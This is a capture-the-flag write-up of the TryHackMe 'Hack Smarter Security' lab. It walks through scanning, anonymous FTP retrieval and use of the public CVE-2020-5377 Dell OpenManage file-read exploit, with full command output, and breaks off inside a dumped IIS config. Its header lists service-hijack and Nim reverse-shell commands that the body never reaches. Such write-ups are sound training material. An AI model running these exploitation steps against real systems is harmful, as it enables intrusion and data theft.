# TryHackMe-Hack Smarter Security

**Scope:**

- Dell OpenManage Server Administrator (OMSA)
- File Disclosure
- Spoofer
- Nim Programming Language

**Keywords:**

- FTP Enumeration
- openssl
- Dell OpenManage Server Administrator Enumeration
- File Disclosure in Dell OpenManage Server
- CVE-2020-5377
- SSH Connection
- PrivescCheck.ps1
- Spoofer Scheduler Service
- Nim Reverse Shell
- nim

**Main Commands:**

- `nmap -sS -sV -sC -T4 -A -O -oN nmap_result.txt -Pn --min-rate=1000 --max-retries=3 -p- $target_ip`
- `nmap --script="ftp-*" -sV -Pn -oN nmap_ftp.txt -p 21 $target_ip`
- `openssl s_client -connect hacksmartersec:21 -starttls ftp`
- `wget -m ftp://anonymous:anonymous@hacksmartersec`
- `file hacksmartersec/stolen-passport.png`
- `searchsploit 'Dell OpenManage'`
- `python dell20205377.py 10.2.37.37 hacksmartersec:1311`
- `ssh -o MACs=hmac-sha2-256 tyler@hacksmartersec`
- `nim c -d:mingw --app:gui rev_shell.nim`

**System Commands:**

- `/Windows/win.ini`
- `/Windows/System32/inetsrv/Config/applicationHost.config`
- `whoami /priv`
- `whoami /groups`
- `systeminfo`
- `wmic product get name, version`
- `sc query WinDefend`
- `. .\priv.ps1; Invoke-PrivescCheck -Extended`
- `sc qc spoofer-scheduler`
- `sc sdshow spoofer-scheduler`
- `sc stop spoofer-scheduler`
- `sc query spoofer-scheduler`
- `sc start spoofer-scheduler`

### Laboratory Environment

[Hack Smarter Security](https://tryhackme.com/r/room/hacksmartersecurity)

### Penetration Approaches and Commands

> **Network Enumeration Phase**
> 

`nmap -sS -sV -sC -T4 -A -O -oN nmap_result.txt -Pn --min-rate=1000 --max-retries=3 -p- $target_ip`

```bash
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
|_06-28-23  03:00PM              1022126 stolen-passport.png
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 0d:fa:da:de:c9:dd:99:8d:2e:8e:eb:3b:93:ff:e2:6c (RSA)
|   256 5d:0c:df:32:26:d3:71:a2:8e:6e:9a:1c:43:fc:1a:03 (ECDSA)
|_  256 c4:25:e7:09:d6:c9:d9:86:5f:6e:8a:8b:ec:13:4a:8b (ED25519)
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HackSmarterSec
|_http-server-header: Microsoft-IIS/10.0
1311/tcp  open  ssl/rxmon?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Strict-Transport-Security: max-age=0
|     X-Frame-Options: SAMEORIGIN
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     vary: accept-encoding
|     Content-Type: text/html;charset=UTF-8
|     Date: Tue, 22 Oct 2024 09:32:11 GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html>
|     <head>
|     <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <title>OpenManage&trade;</title>
|     <link type="text/css" rel="stylesheet" href="/oma/css/loginmaster.css">
|     <style type="text/css"></style>
|     <script type="text/javascript" src="/oma/js/prototype.js" language="javascript"></script><script type="text/javascript" src="/oma/js/gnavbar.js" language="javascript"></script><script type="text/javascript" src="/oma/js/Clarity.js" language="javascript"></script><script language="javascript">
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Strict-Transport-Security: max-age=0
|     X-Frame-Options: SAMEORIGIN
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     vary: accept-encoding
|     Content-Type: text/html;charset=UTF-8
|     Date: Tue, 22 Oct 2024 09:32:18 GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html>
|     <head>
|     <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <title>OpenManage&trade;</title>
|     <link type="text/css" rel="stylesheet" href="/oma/css/loginmaster.css">
|     <style type="text/css"></style>
|_    <script type="text/javascript" src="/oma/js/prototype.js" language="javascript"></script><script type="text/javascript" src="/oma/js/gnavbar.js" language="javascript"></script><script type="text/javascript" src="/oma/js/Clarity.js" language="javascript"></script><script language="javascript">
| ssl-cert: Subject: commonName=hacksmartersec/organizationName=Dell Inc/stateOrProvinceName=TX/countryName=US
| Not valid before: 2023-06-30T19:03:17
|_Not valid after:  2025-06-29T19:03:17
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HACKSMARTERSEC
|   NetBIOS_Domain_Name: HACKSMARTERSEC
|   NetBIOS_Computer_Name: HACKSMARTERSEC
|   DNS_Domain_Name: hacksmartersec
|   DNS_Computer_Name: hacksmartersec
|   Product_Version: 10.0.17763
|_  System_Time: 2024-10-22T09:33:09+00:00
|_ssl-date: 2024-10-22T09:33:23+00:00; -2m12s from scanner time.
| ssl-cert: Subject: commonName=hacksmartersec
| Not valid before: 2024-10-21T09:24:20
|_Not valid after:  2025-04-22T09:24:20
49731/tcp open  tcpwrapped

```

`nano /etc/hosts`

```bash
10.10.232.134  hacksmartersec hacksmartersec.thm
```

> **FTP Enumeration & File Gathering Phase**
> 

`nmap --script="ftp-*" -sV -Pn -oN nmap_ftp.txt -p 21 $target_ip`

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
|_06-28-23  03:00PM              1022126 stolen-passport.png
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 8092 guesses in 600 seconds, average tps: 13.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

`openssl s_client -connect hacksmartersec:21 -starttls ftp`

```bash
---
no peer certificate available
---
No client certificate CA names sent
---
SSL handshake has read 99 bytes and written 448 bytes
Verification: OK
---
New, (NONE), Cipher is (NONE)
This TLS version forbids renegotiation.
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 0 (ok)
---

```

`wget -m ftp://anonymous:anonymous@hacksmartersec`

```bash
           => 'hacksmartersec/.listing'
Resolving hacksmartersec (hacksmartersec)... 10.10.232.134
Connecting to hacksmartersec (hacksmartersec)|10.10.232.134|:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... done.    ==> LIST ... done.

hacksmartersec/.listing                  [ <=>                                                                 ]     126  --.-KB/s    in 0s      

==> PASV ... done.    ==> LIST ... done.

hacksmartersec/.listing                  [ <=>                                                                 ]     126  --.-KB/s    in 0s      

2024-10-22 05:39:19 (37.5 MB/s) - 'hacksmartersec/.listing' saved [252]

--2024-10-22 05:39:19--  ftp://anonymous:*password*@hacksmartersec/Credit-Cards-We-Pwned.txt
           => 'hacksmartersec/Credit-Cards-We-Pwned.txt'
==> CWD not required.
==> PASV ... done.    ==> RETR Credit-Cards-We-Pwned.txt ... done.
Length: 3722 (3.6K)

hacksmartersec/Credit-Cards-We-Pwned 100%[====================================================================>]   3.63K  --.-KB/s    in 0.003s  

2024-10-22 05:39:20 (1.25 MB/s) - 'hacksmartersec/Credit-Cards-We-Pwned.txt' saved [3722]

--2024-10-22 05:39:20--  ftp://anonymous:*password*@hacksmartersec/stolen-passport.png
           => 'hacksmartersec/stolen-passport.png'
==> CWD not required.
==> PASV ... done.    ==> RETR stolen-passport.png ... done.
Length: 1022126 (998K)

hacksmartersec/stolen-passport.png   100%[====================================================================>] 998.17K   185KB/s    in 5.4s    

2024-10-22 05:39:27 (185 KB/s) - 'hacksmartersec/stolen-passport.png' saved [1022126]

FINISHED --2024-10-22 05:39:27--
Total wall clock time: 12s
Downloaded: 3 files, 1002K in 5.4s (186 KB/s)
```

`ls -lsa hacksmartersec`

```bash
   4 -rw-r--r-- 1 root root     126 Oct 22 05:39 .listing
   4 -rw-r--r-- 1 root root    3722 Jun 28  2023 Credit-Cards-We-Pwned.txt
1000 -rw-r--r-- 1 root root 1022126 Jun 28  2023 stolen-passport.png

```

`cat hacksmartersec/Credit-Cards-We-Pwned.txt`

```bash
VISA, 4929012623542946, 8/2027, 273
VISA, 4556638818403096, 8/2024, 166
VISA, 4024007166395359, 12/2027, 209
VISA, 4485714082654957, 12/2028, 834
VISA, 4716405563341310, 12/2023, 235

[REDACTED] - MORE
```

`file hacksmartersec/stolen-passport.png`

```bash
hacksmartersec/stolen-passport.png: PNG image data, 807 x 557, 8-bit/color RGBA, non-interlaced

```

![image.png](image.png)

> **HTTP Port Check**
> 

`curl -iLX GET http://hacksmartersec`

```bash
HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Wed, 11 Oct 2023 17:10:49 GMT
Accept-Ranges: bytes
ETag: "821ebe165fcd91:0"
Server: Microsoft-IIS/10.0
Date: Tue, 22 Oct 2024 09:42:18 GMT
Content-Length: 3998

<!DOCTYPE html>
<html>

<head>

  <!-- Basic -->
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <!-- Mobile Metas -->
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
  <!-- Site Metas -->
  <meta name="keywords" content="" />
  <meta name="description" content="" />
  <meta name="author" content="" />

  <title>HackSmarterSec</title>

  <!-- slider stylesheet -->

  <!-- font wesome stylesheet -->

  <!-- bootstrap core css -->
  <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />

  <!-- Custom styles for this template -->
  <link href="css/style.css" rel="stylesheet" />
  <!-- responsive style -->
  <link href="css/responsive.css" rel="stylesheet" />
</head>

<body>
  <div class="hero_area">
    <!-- header section strats -->
    <header class="header_section">
      <div class="container">
        <nav class="navbar navbar-expand-lg custom_nav-container pt-3">
          <a class="navbar-brand mr-5" href="index.html">
            <span>
              HackSmarter Security
            </span>
          </a>
          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
          </button>
          <div class="collapse navbar-collapse" id="navbarSupportedContent">
            <div class="d-flex ml-auto flex-column flex-lg-row align-items-center">
              <ul class="navbar-nav  ">
                <li class="nav-item active">
                  <a class="nav-link" href="index.html">Home <span class="sr-only">(current)</span></a>
                </li>
                <li class="nav-item">
                  <a class="nav-link" href="about.html"> Learn More </a>
                </li>
                <li class="nav-item">
                  <a class="nav-link" href="contact.html">H4x0rs For Hire</a>
                </li>
              </ul>
              <form class="form-inline">
                <button class="btn  my-2 my-sm-0 nav_search-btn" type="submit"></button>
              </form>
            </div>
          </div>
        </nav>
      </div>
    </header>
    <!-- end header section -->
    <!-- slider section -->
 
    <!-- end slider section -->
  </div>

  <!-- about section -->

  <section class="about_section layout_padding">
    <div class="container">
      <div class="row">
        <div class="col-md-6">
          <div class="detail-box">
            <div class="heading_container">
              <h2>
                Learn More
              </h2>
            </div>
            <p>
              Welcome to HackSmarterSec. We are a group of blackhat hackers who decided to take a break from ransomware to improve your company's security. If you landed on this page, it's because we hacked you or you want us to hack someone else with our 1337 h4x0r skillz. Whether you need to get revenge on your past employer or get access to your girlfriend's social media account, you're in the right place.           </div>
        </div>
        <div class="col-md-6">
          <div class="img-box">
            <img src="images/about-img.jpg" alt="">
          </div>
        </div>
      </div>
    </div>
  </section>
  <!-- end about section -->
  <div class="body_bg layout_padding">

  <!-- end info section -->

  <!-- footer section -->
  <section class="container-fluid footer_section">
    <p>
      Copyright &copy; 2019 All Rights Reserved By
      <a href="https://html.design/">Free Html Templates</a>
    </p>
  </section>
  <!-- footer section -->

  <script type="text/javascript" src="js/jquery-3.4.1.min.js"></script>
  <script type="text/javascript" src="js/bootstrap.js"></script>

</body>

</html>
```

`curl -iLX GET http://hacksmartersec/about.html`

```bash
[REDACTED] - MORE

            </div>
            <p>
              Welcome to Hack Smarter Security. We are a group of blackhat hackers who decided to take a break from ransomware to improve your company's security. If you landed on this page, it's because we hacked you or you want us to hack someone else with our 1337 h4x0r skillz. Whether you need to get revenge on your past employer or get access to your girlfriend's social media account, you're in the right place.           </div>
        </div>

[REDACTED] - MORE
```

> **Dell OpenManage Server Administrator Enumeration Phase**
> 

`curl -ikLX GET https://hacksmartersec:1311/`

```bash
HTTP/1.1 200 
Strict-Transport-Security: max-age=0
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
vary: accept-encoding
Content-Type: text/html;charset=UTF-8
Transfer-Encoding: chunked
Date: Tue, 22 Oct 2024 09:45:23 GMT

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html>
<head>
<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>OpenManage&trade;</title>
<link type="text/css" rel="stylesheet" href="/oma/css/loginmaster.css">
<style type="text/css"></style>
<script type="text/javascript" src="/oma/js/prototype.js" language="javascript"></script><script type="text/javascript" src="/oma/js/gnavbar.js" language="javascript"></script><script type="text/javascript" src="/oma/js/Clarity.js" language="javascript"></script><script language="javascript">
           if(window != top) {
                                                // Load page in the top frame.
                                                top.location.href = window.location.href
                                        }
                                        // QueryString
                                        //

 

                                        function QueryString(key) {                                      
                                                var value = null;
                                                for (var i = 0; i < QueryString.keys.length; i++) {
                                                        if (QueryString.keys[i]==key)
                                                        {
                                                                value = QueryString.values[i];
                                                                break;
                                                        }
                                                }
                                                return value;
                                        }
                                        QueryString.keys = new Array();
                                        QueryString.values = new Array();

                                        function QueryString_Parse()
                                        {
                                                var query = window.location.search.substring(1);
                                                var pairs = query.split("&");

                                                for (var i = 0;i < pairs.length; i++)
                                                {
                                                        var pos = pairs[i].indexOf('=');
                                                        if (pos >= 0)
                                                        {
                                                                var argname = pairs[i].substring(0,pos);
                                                                var value = pairs[i].substring(pos+1);
                                                                QueryString.keys[QueryString.keys.length] = argname;
                                                                QueryString.values[QueryString.values.length] = value;
                                                        }
                                                }

                                        }

                                        QueryString_Parse();
                                </script><script language="javascript">
                                    var sQueryString = "";
                                        if(QueryString("mnip") != null) {
                              sQueryString += '&mnip=' + QueryString("mnip");   
                              }
                            if(QueryString("authType") != null) {
                              sQueryString += '&authType=' + QueryString("authType");    
                              sQueryString += '&application=' + QueryString("application");
                            }
                            if(QueryString("locallogin") != null) {
                              sQueryString += '&locallogin=' + QueryString("locallogin");    
                            }

                                        if (QueryString("denyLevel") == null) {
                                                document.write('<meta http-equiv="REFRESH" content="0;url=./OMSALogin?msgStatus=' + QueryString("msgStatus") + sQueryString + '">');
                                        }
                                        else {
                                                document.write('<meta http-equiv="REFRESH" content="0;url=./OMSALogin?msgStatus=' + QueryString("msgStatus") + '&denyLevel=' + QueryString("denyLevel") + sQueryString + '">');
                                        }
                        </script>
</head>
<noscript>
<body>
<div class="login">
<div class="login_header_brand" style="background-image:url('/oma/images/dell/login_table_header.png')">
<p>|</p>
<img title="OpenManage" alt="OpenManage" src="/oma/images/dell/om_title.png"></div>
<div class="login_left">
<div class="login_right">
<div class="login_content">
<div style="display: block;" id="login_info">
<div class="hr"></div>
<div class="login_help">
<a title="Help" href="./HelpViewer?file=Redirect&app=oma"><span class="login_help_icon">&nbsp;</span></a>
</div>
<br>
</div>
<div id="reboot">
<div id="login_failed_text"></div>
<div id="server_reboot_message">The security settings for your browser prevent the execution of client-side scripts used by this application. To enable the use of client-side scripts, follow the help link for information on solving this problem.</div>
</div>
<div class="hr"></div>
<div>
<div id="login_buttons" class="button_clear"></div>

<div class="login_footer"></div>
<div class="title_links"></div>
</div>
</body>
</noscript>
</html>

```

![image.png](image%201.png)

`curl -ikLX GET https://hacksmartersec:1311/OMSALogin?msgStatus=null`

```bash
HTTP/1.1 200 
Strict-Transport-Security: max-age=0
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-store
Pragma: no-cache
Expires: -1
vary: accept-encoding
Content-Type: text/html;charset=UTF-8
Transfer-Encoding: chunked
Date: Tue, 22 Oct 2024 09:48:03 GMT

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<HTML>
<head>
<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
<script language="javascript">
                            if (window != top) {
                            // Load page in the top frame.
                            top.location.href = window.location.href
                            }
                                                        </script><script type="text/javascript" src="/oma/js/favicon.js"></script><script language="javascript">
                                changeFavicon('/oma/images/dell/favicon.ico'); 
                          </script>
<title>Dell EMC OpenManage </title>
<frameset framespacing="0" frameborder="no" border="0">
<frame name="managedws" src="./Login?omacmd=getlogin&page=Login&managedws=false">
</frameset>
</head>
</HTML>
```

`curl -ikLX GET https://hacksmartersec:1311/UOMSAAbout`

```bash
HTTP/1.1 200 
Strict-Transport-Security: max-age=0
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-store
Pragma: no-cache
Expires: -1
vary: accept-encoding
Content-Type: text/html;charset=UTF-8
Transfer-Encoding: chunked
Date: Tue, 22 Oct 2024 09:49:45 GMT

<HTML xmlns:fo="http://www.w3.org/1999/XSL/Format">
<head>
<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>About&nbsp;
                                Dell EMC OpenManage </title>
<script type="text/javascript" src="/oma/js/favicon.js"></script><script language="javascript">
                                        changeFavicon('/oma/images/dell/favicon.ico'); 
                                </script>
</head>
<frameset border="0" rows="100%">
<frame framespacing="0" frameborder="no" marginwidth="0" marginheight="0" scrolling="auto" name="about" src="./UDataArea?plugin=com.dell.oma.webplugins.AboutWebPlugin&vid=">
</frameset>
<noframes></noframes>
</HTML>

```

![image.png](image%202.png)

> **File Disclosure in Dell OpenManage Server & Data Exfiltration Phase**
> 

**For more information:**

[CVE-2020-5377: Dell OpenManage Server Administrator File Read - Rhino Security Labs](https://rhinosecuritylabs.com/research/cve-2020-5377-dell-openmanage-server-administrator-file-read/)

`searchsploit 'Dell OpenManage'`

```bash
---------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                  |  Path
---------------------------------------------------------------------------------------------------------------- ---------------------------------
Dell OpenManage Network Manager 6.2.0.51 SP3 - Multiple Vulnerabilities                                         | linux/webapps/45852.py
Dell OpenManage Server Administrator - Cross-Site Scripting                                                     | multiple/remote/38179.txt
Dell OpenManage Server Administrator 8.2 - (Authenticated) Directory Traversal                                  | windows/webapps/39486.txt
Dell OpenManage Server Administrator 8.3 - XML External Entity                                                  | xml/webapps/39909.rb
Dell OpenManage Server Administrator 9.4.0.0 - Arbitrary File Read                                              | windows/webapps/49750.py
---------------------------------------------------------------------------------------------------------------- ---------------------------------
```

`wget https://raw.githubusercontent.com/RhinoSecurityLabs/CVEs/refs/heads/master/CVE-2020-5377_CVE-2021-21514/CVE-2020-5377.py -O dell20205377.py`

```bash
dell20205377.py                      100%[====================================================================>]   5.42K  --.-KB/s    in 0.003s  

2024-10-22 05:56:36 (1.74 MB/s) - 'dell20205377.py' saved [5554/5554]

```

**For script source:**

[https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2020-5377_CVE-2021-21514/CVE-2020-5377.py](https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2020-5377_CVE-2021-21514/CVE-2020-5377.py)

`python dell20205377.py 10.2.37.37 hacksmartersec:1311`

```bash
[-] No server.pem certificate file found. Generating one...

[REDACTED] - MORE

Session: 8CF4AD69CBA2F300E7BBF29A393428A5
VID: 3E53373AAF12EE27
file > Reading contents of :

file > /Windows/win.ini
Reading contents of /Windows/win.ini:
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1

file > /Windows/System32/inetsrv/Config/applicationHost.config
Reading contents of /Windows/System32/inetsrv/Config/applicationHost.config:
<?xml version="1.0" encoding="UTF-8"?>
<!--

    IIS configuration sections.

    For schema documentation, see
    %windir%\system32\inetsrv\config\schema\IIS_schema.xml.
    
    Please make a backup of this file before making any changes to it.

-->

<configuration>

    <!--

        The <configSections> section controls the registration of sections.
        Section is the basic unit of deployment, locking, searching and
        containment for configuration settings.
        
        Every section belongs to one section group.
        A section group is a container of logically-related sections.
        
        Sections cannot be nested.
        Section groups may be nested.
        
        <section
            name=""  [Required, Collection Key] [XML name of the section]
            allowDefinition="Everywhere" [MachineOnly|MachineToApplication|AppHostOnly|Everywhere] [Level where it can be set]
            overrideModeDefault="Allow"  [Allow|Deny] [Default delegation mode]
            allowLocation="true"  [true|false] [Allowed in location tags]
        />
        
        The recommended way to unlock sections is by using a location tag:
        <location path="Default Web Site" overrideMode="Allow">
            <system.webServer>
                <asp />
            </system.webServer>
        </location>

    -->
    <configSections>
        <sectionGroup name="system.applicationHost">
            <section name="applicationPools" allowDefinition="AppHostOnly" overrideModeDefault="Deny" />
            <section name="configHistory" allowDefinition="AppHostOnly" overrideModeDefault="Deny" />
            <section name="customMetadata" allowDefinition="AppHostOnly" overrideModeDefault="Deny" />
            <section name="listenerAdapters" allowDefinition="AppHostOnly" overrideModeDefault="Deny" />
            <section name="log" allowDefinition="AppHostOnly" overrideModeDefault="Deny" />
            <section name="serviceAutoStartProviders" allowDefinition="AppHostOnly" overrideModeDefault="Deny" />
            <section name="sites" allowDefinition="AppHostOnly" overrideModeDefault="Deny" />
            <section name="webLimits" allowDefinition="AppHostOnly" overrideModeDefault="Deny" />
        </sectionGroup>

        <sectionGroup name="system.webServer">
            <section name="asp" overrideModeDefault="Deny" />
            <section name="caching" overrideModeDefault="Allow" />
            <section name="cgi" overrideModeDefault="Deny" />
            <section name="defaultDocument" overrideModeDefault="Allow" />
            <section name="directoryBrowse" overrideModeDefault="Allow" />
            <section name="fastCgi" allowDefinition="AppHostOnly" overrideModeDefault="Deny" />
            <section name="globalModules" allowDefinition="AppHostOnly" overrideModeDefault="Deny" />
            <section name="handlers" overrideModeDefault="Deny" />
            <section name="httpCompression" overrideModeDefault="Allow" />
            <section name="httpErrors" overrideModeDefault="Allow" />
            <section name="httpLogging" overrideModeDefault="Deny" />
            <section name="httpProtocol" overrideModeDefault="Allow" />
            <section name="httpRedirect" overrideModeDefault="Allow" />
            <section name="httpTracing" overrideModeDefault="Deny" />
            <section name="isapiFilters" allowDefinition="MachineToApplication" overrideModeDefault="Deny" />
            <section name="modules" allowDefinition="MachineToApplication" overrideModeDefault="Deny" />
            <section name="applicationInitialization" allowDefinition="MachineToApplication" overrideModeDefault="Allow" />
            <section name="odbcLogging" overrideModeDefault="Deny" />
            <sectionGroup name="security">
                <section name="access" overrideModeDefault="Deny" />
                <section name="applicationDependencies" overrideModeDefault="Deny" />
                <sectionGroup name="authentication">
                    <section name="anonymousAuthentication" overrideModeDefault="Deny" />
                    <section name="basicAuthentication" overrideModeDefault="Deny" />
                    <section name="clientCertificateMappingAuthentication" overrideModeDefault="Deny" />
                    <section name="digestAuthentication" overrideModeDefault="Deny" />
                    <section name="iisClientCertificateMappingAuthentication" overrideModeDefault="Deny" />
                    <section name="windowsAuthentication" overrideModeDefault="Deny" />
                </sectionGroup>
                <section name="authorization" overrideModeDefault="Allow" />
                <section name="ipSecurity" overrideModeDefault="Deny" />
                <section name="dynamicIpSecurity" overrideModeDefault="Deny" />
                <section name="isapiCgiRestriction" allowDefinition="AppHostOnly" overrideModeDefault="Deny" />
                <section name="requestFiltering" overrideModeDefault="Allow" />
            </sectionGroup>
            <section name="serverRuntime" overrideModeDefault="Deny" />
            <section name="serverSideInclude" overrideModeDefault="Deny" />
            <section name="staticContent" overrideModeDefault="Allow" />
            <sectionGroup name="tracing">
                <section name="traceFailedRequests" overrideModeDefault="Allow" />
                <section name="traceProviderDefinitions" overrideModeDefault="Deny" />
            </sectionGroup>
            <section name="urlCompression" overrideModeDefault="Allow" />
            <section name="validation" overrideModeDefault="Allow" />
            <sectionGroup name="webdav">
                <section name="globalSettings" overrideModeDefault="Deny" />
                <section name="authoring" overrideModeDefault="Deny" />
                <section name="authoringRules" overrideModeDefault="Deny" />
            </sectionGroup>
            <section name="webSocket" overrideModeDefault="Deny" />
        </sectionGroup>
        <sectionGroup name="system.ftpServer">
            <section name="log" overrideModeDefault="Deny" allowDefinition="AppHostOnly" />
            <section name="firewallSupport" overrideModeDefault="Deny" allowDefinition="AppHostOnly" />
            <section name="caching" overrideModeDefault="Deny" allowDefinition="AppHostOnly" />
            <section name="providerDefinitions" overrideModeDefault="Deny" />
            <sectionGroup name="security">
                <section name="ipSecurity" overrideModeDefault="Deny" />
                <section name="requestFiltering" overrideModeDefault="Deny" />
                <section name="authorization" overrideModeDefault="Deny" />
                <section name="authentication" overrideModeDefault="Deny" />
            </sectionGroup>
            <section name="serverRuntime" overrideModeDefault="Deny" allowDefinition="AppHostOnly" />
        </sectionGroup>
    </configSections>

    <configProtectedData>
        <providers>
            <add name="IISWASOnlyRsaProvider" type="" description="Uses RsaCryptoServiceProvider to encrypt and decrypt" keyContainerName="iisWasKey" cspProviderName="" useMachineContainer="true" useOAEP="false" />
            <add name="IISCngProvider" type="Microsoft.ApplicationHost.CngProtectedConfigurationProvider" description="Uses Win32 Crypto CNG to encrypt and decrypt" keyContainerName="iisCngConfigurationKey" useMachineContainer="true" />
            <add name="IISWASOnlyCngProvider" type="Microsoft.ApplicationHost.CngProtectedConfigurationProvider" description="(WAS Only) Uses Win32 Crypto CNG to encrypt and decrypt" keyContainerName="iisCngWasKey" useMachineContainer="true" />
            <add name="AesProvider" type="Microsoft.ApplicationHost.AesProtectedConfigurationProvider" description="Uses an AES session key to encrypt and decrypt" keyContainerName="iisConfigurationKey" cspProviderName="" useOAEP="false" useMachineContainer="true" sessionKey="AQIAAA5mAAAApAAAMXVoZzljV8nMixj5wAVkhdu0ZHzH0L0FO8BTgdFkl2CbXD2eFMhWi0vb+AR6VUrvCCjKf+LzvWRKnGoz812ACweT3/ZPrcIh+Ef24nSvl6TQTcq5EI4jQgQRRhZ90+OofCAutPXcOZNVLjIlZgJjQgP07e3xrtVijkhSS3j4T1xsuE3YaWiMwCDEzxUPr2cHtLRYQxkDSvyPpvoLtab8VLH/aa90OuYx6z7o8n2332trJBC8rRNCNFI3UrsUuzASouD+3BwJTliDXCO3ozHgr1VgBaKB2vOSfiW+HZbImo9/WgRmSHC6FtGWqkhMxACOnp0vc3pRvPF/TQtjf9vpCA==" />
            <add name="IISWASOnlyAesProvider" type="Microsoft.ApplicationHost.AesProtectedConfigurationProvider" description="Uses an AES session key to encrypt and decrypt" keyContainerName="iisWasKey" cspProviderName="" useOAEP="false" useMachineContainer="true" sessionKey="AQIAAA5mAAAApAAARMxzOPMhM9dK68CJAUfppvnrJoKq10wpgKSfoeTwZlOwBE1K2kmEB/PUK6omNDZnbBlGlrkOX0hkf9EE1ZVl2oEqHOa0b6V2/4nzFssq/WvUvkM3QpkacJRr8oD2l6u6TABWvaMMDCABjJkWPhYi3XENdJYPl62S+GuGqVBAXUY52//ZDWp4Z+AoDYpH254ZGkt8fbBAThMGsyuewmluQJQq3uPN3D/I6uXceSFYKQH8sb8uK1zGZV7p2+6WEW5mF2DKXG+5WdDP+Si/UA8frR30O0vNOh/fReLHgCeMdUsf/XW5cB+CkGmipA1p4nCs591Md7d7Ge9ypUufCo1ueQ==" />
        </providers>
    </configProtectedData>

    <system.applicationHost>

        <applicationPools>
            <add name="DefaultAppPool" />
            <add name="hacksmartersec" />
            <applicationPoolDefaults managedRuntimeVersion="v4.0">
                <processModel identityType="ApplicationPoolIdentity" />
            </applicationPoolDefaults>
        </applicationPools>

        <!--

          The <customMetadata> section is used internally by the Admin Base Objects
          (ABO) Compatibility component. Please do not modify its content.

        -->
        <customMetadata />

        <!--

          The <listenerAdapters> section defines the protocols with which the
          Windows Process Activation Service (WAS) binds.

        -->
        <listenerAdapters>
            <add name="http" />
        </listenerAdapters>

        <log>
            <centralBinaryLogFile enabled="true" directory="%SystemDrive%\inetpub\logs\LogFiles" />
            <centralW3CLogFile enabled="true" directory="%SystemDrive%\inetpub\logs\LogFiles" />
        </log>

        <sites>
            <site name="hacksmartersec" id="2" serverAutoStart="true">
                <application path="/" applicationPool="hacksmartersec">
                    <virtualDirectory path="/" physicalPath="C:\inetpub\wwwroot\hacksmartersec" />
                </application>
                <bindings>
                    <binding protocol="http" bindingInformation="*:80:" />
                </bindings>
            </site>
            <site name="data-leaks" id="1">
                <application path="/">
                    <virtualDirectory path="/" physicalPath="C:\inetpub\ftproot" />
                </application>
                <bindings>
                    <binding protocol="ftp" bindingInformation="*:21:" />
                </bindings>
                <ftpServer>
                    <security>
                        <ssl controlChannelPolicy="SslAllow" dataChannelPolicy="SslAllow" />
                    </security>
                </ftpServer>
            </site>
            <siteDefaults>
                <logFile logFormat="W3C" directory="%SystemDrive%\inetpub\logs\LogFiles" />
                <traceFailedRequestsLogging directory="%SystemDrive%\inetpub\logs\FailedReqLogFiles" />
                <ftpServer>
                    <security>
                        <authentication>
                            <anonymousAuthentication enabled="true" />
                        </authentication>
                    </security>
                </ftpServer>
            </siteDefaults>
            <applicationDefaults applicationPool="DefaultAppPool" />
            <virtualDirectoryDefaults allowSubDirConfig="true" />
        </sites>

        <webLimits />

